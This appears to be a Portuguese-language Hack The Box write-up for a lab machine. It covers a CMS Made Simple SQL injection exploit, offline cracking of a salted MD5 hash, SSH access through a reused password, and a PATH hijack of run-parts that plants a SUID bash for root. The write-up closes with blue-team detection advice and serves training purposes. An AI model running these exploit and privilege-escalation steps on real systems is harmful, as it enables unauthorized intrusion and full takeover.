# Writeup — Hack The Box

| | |
|---|---|
| **Máquina** | Writeup |
| **SO** | Linux (Devuan) |
| **Dificuldade** | Easy |
| **Tópicos** | SQL Injection (CVE-2019-9053) · Password Cracking · Linux Privesc (grupo `staff` + PATH Hijacking) |

---

## Resumo

O foothold vem de uma **SQL Injection** no CMS Made Simple (CVE-2019-9053), que vaza o usuário e um hash de senha com salt. O hash é quebrado offline e a senha está **reutilizada no SSH**. A escalação de privilégio abusa do grupo **`staff`** (escrita em `/usr/local/bin`, que está no início do `PATH` do root) para sequestrar o binário **`run-parts`**, executado como root toda vez que alguém faz login via SSH (geração dinâmica do MOTD).

---

## 1. Reconhecimento

```bash
nmap -sC -sV -oA nmap/writeup 10.129.X.X
```

Portas relevantes:

- **22/tcp** — OpenSSH
- **80/tcp** — Apache (CMS Made Simple)

> 📌 A raiz (`/`) exibe uma página de proteção contra DoS, indício de **fail2ban** ativo. Isso descarta brute force no SSH — ir de força aqui só resulta em ban do IP. Melhor caminho: achar credencial.

---

## 2. Enumeração Web

Fuzzing de diretórios revela `/writeup/`, rodando **CMS Made Simple**:

```bash
ffuf -u http://10.129.X.X/FUZZ -w /usr/share/wordlists/dirb/common.txt -rate 50
whatweb http://10.129.X.X/writeup/
```

A versão do CMS é vulnerável a uma SQL Injection conhecida.

---

## 3. Exploração — SQL Injection (CVE-2019-9053)

```bash
searchsploit "CMS Made Simple"
searchsploit -m 46635
python2 46635.py -u http://10.129.X.X/writeup/ -w /usr/share/wordlists/rockyou.txt | tee loot.txt
```

> O exploit é um **blind SQLi time-based** — extrai caractere por caractere, então é lento (alguns minutos). Dica: sempre salve a saída em arquivo (`tee`) para não perder o loot se o terminal fechar.

Saída (exemplo):

```
[+] Salt for password found: 5a599ef...
[+] Username found: jkr
[+] Email found: jkr@writeup.htb
[+] Password found: 62def48...   (hash MD5)
```

---

## 4. Cracking offline do hash

O hash tem **32 caracteres hex → MD5**, e o CMS Made Simple monta a senha como `md5($salt . $password)` (salt concatenado **antes** da senha). No hashcat isso é o **modo 20** (`md5($salt.$pass)`), com a entrada no formato `hash:salt`:

```bash
echo '<hash>:<salt>' > hash.txt
hashcat -m 20 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

Senha recuperada em ~1 segundo. Cracking offline = sem fail2ban, velocidade total.

---

## 5. Foothold

A senha está **reutilizada no SSH**:

```bash
ssh jkr@10.129.X.X
cat user.txt
```

---

## 6. Escalação de privilégio — grupo `staff` + PATH Hijacking

Reconhecimento do próprio acesso:

```bash
id
# groups=...,50(staff),...
```

No Debian/Devuan, o grupo **`staff`** dá escrita em `/usr/local/bin` e `/usr/local/sbin` — pastas que estão no **início do `PATH` do root**.

Monitorando processos com `pspy` (rodando a partir do home, pois `/dev/shm` costuma estar com `noexec`):

```bash
# transferência via scp (conexão de saída, funciona normalmente)
scp $(which pspy) jkr@10.129.X.X:/dev/shm/pspy
# no alvo:
cp /dev/shm/pspy ~/pspy && chmod +x ~/pspy && ~/pspy
```

Ao disparar um **novo login SSH** em outra sessão, o `pspy` captura o root executando:

```
UID=0 | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
UID=0 | run-parts --lsbsysinit /etc/update-motd.d
```

Dois detalhes fecham o ataque:
1. O root chama **`run-parts` pelo nome puro** (sem caminho absoluto).
2. O `PATH` começa por `/usr/local/sbin:/usr/local/bin`, onde o grupo `staff` **escreve**.

Basta plantar um `run-parts` malicioso nessas pastas. Para evitar depender de rede (reverse shell), o payload apenas cria um **bash com SUID**:

```bash
printf '#!/bin/bash\ncp /bin/bash /tmp/rootbash\nchmod +s /tmp/rootbash\n' > /usr/local/bin/run-parts
chmod +x /usr/local/bin/run-parts
```

Dispara o gatilho com um novo login SSH e vira root:

```bash
ssh jkr@10.129.X.X      # root executa o run-parts falso
/tmp/rootbash -p        # euid=0
id
cat /root/root.txt
```

---

## Lições aprendidas

- **Senha reutilizada** é um dos maiores vetores de entrada — hash salgado não protege senha fraca.
- O grupo **`staff`** parece inofensivo, mas escrita em `/usr/local/*` (no `PATH` do root) é escalada de privilégio completa.
- **`noexec`** em `/dev/shm` e `/tmp` muda onde você consegue executar binários.
- Prefira **SUID** a reverse shell quando a rede está limitada.

### Perspectiva Blue Team / detecção

- Política de senha forte + bloqueio de reutilização.
- Auditoria de **membros de grupos privilegiados** (`staff`, `adm`, `docker`...).
- Monitoramento de **escrita em `/usr/local/bin`** e de **binários SUID recém-criados**.
- Alerta para execução de binários a partir de caminhos graváveis por usuários comuns.
